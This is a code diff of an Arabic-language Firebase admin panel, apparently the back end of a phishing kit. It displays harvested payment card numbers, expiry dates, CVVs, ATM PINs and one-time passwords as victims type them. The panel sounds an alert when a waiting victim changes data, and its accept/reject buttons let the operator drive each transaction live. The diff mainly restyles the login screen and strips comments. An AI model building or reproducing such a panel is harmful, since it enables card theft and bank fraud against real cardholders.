@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة تحكم المهندس حسن - التحديث اللحظي</title>
+    <title>لوحة التحكم - تسجيل دخول</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
@@ -23,7 +23,6 @@
         
         .ltr-fix { direction: ltr !important; unicode-bidi: bidi-override !important; display: inline-block; text-align: left !important; font-family: monospace; letter-spacing: 1px; }
 
-        /* سطر منبه - للبيانات الجديدة أو المعدلة */
         .is-new-row { background: #0d2112 !important; border-right: 5px solid #28a745 !important; animation: blink 1.5s infinite; }
         @keyframes blink { 0% { background: #0d2112; } 50% { background: #1b3d24; } 100% { background: #0d2112; } }
         
@@ -31,7 +30,13 @@
         .active-green { background: #28a745 !important; color: white !important; }
         .active-red { background: #dc3545 !important; color: white !important; }
 
+        /* شاشة الدخول المعدلة */
         #loginOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1e7344; display: flex; align-items: center; justify-content: center; z-index: 9999; }
+        .login-card { background: white; padding: 40px; border-radius: 15px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3); width: 320px; }
+        .login-card h2 { color: #1e7344; margin: 0 0 20px 0; font-size: 22px; }
+        .login-card input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 8px; outline: none; text-align: center; font-size: 16px; }
+        .login-card button { width: 100%; padding: 12px; background: #1e7344; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; transition: 0.3s; }
+        .login-card button:hover { background: #145a34; }
     </style>
 </head>
 <body onload="checkSavedLogin()">
@@ -39,14 +44,14 @@
 <audio id="alertSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>
 
 <div id="loginOverlay">
-    <div style="background:white; padding:40px; border-radius:15px; text-align:center;">
-        <h2 style="color:#1e7344">دخول المهندس حسن</h2>
-        <input type="password" id="password" placeholder="كلمة المرور" style="width:100%; padding:10px; margin-bottom:10px;">
-        <button onclick="checkLogin()" style="width:100%; padding:10px; background:#1e7344; color:white; border:none; border-radius:5px; cursor:pointer;">دخول</button>
+    <div class="login-card">
+        <h2>تسجيل دخول</h2>
+        <input type="password" id="password" placeholder="كلمة المرور">
+        <button onclick="checkLogin()">دخول</button>
     </div>
 </div>
 
-<div id="adminContent">
+<div id="adminContent" style="display:none;">
     <div class="visitor-counter">المتواجدون الآن: <span id="onlineCount">0</span> 🌐</div>
     <div class="navbar">
         <button class="nav-btn active" onclick="openTab(event, 'cardsSection')">💳 البطاقات</button>
@@ -105,30 +110,24 @@
             document.getElementById('onlineCount').innerText = active;
         });
 
-        // استلام البطاقات
         database.ref('payments').on('child_added', s => { renderCardRow(s.key, s.val()); });
         
-        // السر هنا: تحديث البيانات فور تغيرها عند العميل
         database.ref('payments').on('child_changed', s => {
             const val = s.val();
             const row = document.getElementById('row_' + s.key);
             if(row) {
-                // تحديث الخانات فوراً بالقيم الجديدة
                 row.querySelector('.val-card').innerText = val.cardNumber;
                 row.querySelector('.val-expiry').innerText = val.expiry;
                 row.querySelector('.val-cvv').innerText = val.cvv;
                 row.querySelector('.val-pin').innerText = val.atm_pin || '-';
                 row.querySelector('.val-otp').innerText = val.otp || '-';
 
-                // تشغيل التنبيه لو العميل غير حاجة وهو في وضع الانتظار
                 if(val.status && val.status.includes('waiting')) {
                     row.classList.add('is-new-row');
                     row.querySelector('.btn-green').classList.add('active-green');
                     row.querySelector('.btn-red').classList.add('active-red');
                     playSound();
                 }
-                
-                // إطفاء التنبيه لو العملية خلصت
                 if(val.status === 'accept' || val.status === 'reject') {
                     row.classList.remove('is-new-row');
                     row.querySelector('.btn-green').classList.remove('active-green');
@@ -142,8 +141,7 @@
 
     function renderCardRow(key, val) {
         const list = document.getElementById('paymentsList');
-        if(document.getElementById('row_' + key)) return; // منع التكرار
-
+        if(document.getElementById('row_' + key)) return;
         const tr = document.createElement('tr');
         tr.id = 'row_' + key;
         tr.innerHTML = `
@@ -177,9 +175,7 @@
         list.prepend(tr);
     }
 
-    function updateStat(id, action) { 
-        firebase.database().ref('payments/' + id).update({ status: action }); 
-    }
+    function updateStat(id, action) { firebase.database().ref('payments/' + id).update({ status: action }); }
 
     function openTab(evt, name) {
         document.querySelectorAll(".tab-content").forEach(t => t.style.display = "none");
